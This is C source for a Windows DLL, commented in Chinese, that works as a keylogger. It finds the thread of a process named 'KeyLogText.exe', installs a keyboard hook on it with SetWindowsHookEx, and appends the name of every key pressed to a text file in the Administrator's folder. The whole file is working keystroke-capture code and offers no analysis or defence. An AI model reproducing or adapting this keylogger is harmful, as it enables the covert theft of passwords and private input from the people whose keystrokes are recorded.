#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>

static HINSTANCE hdll;
static HHOOK hook = NULL;
FILE *fp = NULL;


// 使用__declspec(dllexport)声明导出函数
__declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam);
__declspec(dllexport)  BOOL test();
__declspec(dllexport) BOOL UnstallHook();


int getThreadID(int pid)
{
    THREADENTRY32 te32;
    te32.dwSize = sizeof(te32);
    HANDLE Snapshot_thread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (Snapshot_thread != INVALID_HANDLE_VALUE)
    {
        if (Thread32First(Snapshot_thread, &te32))
        {
            do
            {
                if (te32.th32OwnerProcessID == pid)
                {
                    return te32.th32ThreadID;
                }
            } while (Thread32Next(Snapshot_thread, &te32));
        }
    }
    CloseHandle(Snapshot_thread);
    return 0;
}

int getPID(char *target)
{
    PROCESSENTRY32 pe32;
    MODULEENTRY32 me32;
    HANDLE hProcess, hSnapshot_proc, hSnapshot_mod;
    pe32.dwSize = sizeof(pe32);
    hSnapshot_proc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot_proc, &pe32))
    {
        do
        {
            if (!strcmp(pe32.szExeFile, target))
            {
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot_proc, &pe32));
    }
    CloseHandle(hSnapshot_proc);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered)
{
    // MessageBox(NULL, TEXT("This is DllMain!"), TEXT("Tips"), MB_OK);
    

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        /* 只有第一次会进到这里，之后再次Attach不会产生DLL_PROCESS_ATTACH，只会增加DLL的调用次数 */
        hdll = hinstDll;
        //MessageBox(NULL, TEXT("Process Load Dll Success!"), TEXT("Tips"), MB_OK);
        break;
    case DLL_PROCESS_DETACH:
        hdll = NULL;
         MessageBox(NULL, TEXT("Process Unload Dll Success!"), TEXT("Tips"), MB_OK);
        break;
    case DLL_THREAD_ATTACH:
         //MessageBox(NULL, TEXT("Thread load Dll Success!"), TEXT("Tips"), MB_OK);
        break;
    case DLL_THREAD_DETACH:
         //MessageBox(NULL, TEXT("Thread Unload Dll Success!"), TEXT("Tips"), MB_OK);
        break;
    }
    return TRUE;
}


//键盘钩子处理过程
LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
{
    //将输入的记录到log。。。。。。。。。

    if(nCode >= 0){
        if(!(lParam & 0x80000000)){
            fp = fopen("C:\\Documents and Settings\\Administrator\\show.txt","a+");
            if(fp != NULL){
                char str[20] = {0};
                int len = GetKeyNameText(lParam, str, 20);
                if(len > 1)
                    fprintf(fp, "<%s>", str );
                else
                    fprintf(fp, "%s", str );
                fclose(fp); 
            }else printf("error open file!\n");
        }
    }
    return CallNextHookEx( hook, nCode, wParam, lParam );  
   
}

BOOL test()
{
    //MessageBox(NULL, TEXT("SetWindowsHookEx Success!"), TEXT("Tips"), MB_OK);
    hook = SetWindowsHookEx(
    WH_KEYBOARD, // 监听类型【键盘消息】
    (HOOKPROC)KeyboardProc, // 处理函数
    hdll, // dll的句柄
    getThreadID(getPID("KeyLogText.exe")) // 监听线程ID
    );

    if(hook != NULL)
    {
        printf("Setwindowshook done!\n");
    }
    return 0;
}

BOOL UnstallHook()
{       
    BOOL unhooked = UnhookWindowsHookEx(hook);
    return unhooked;
} 




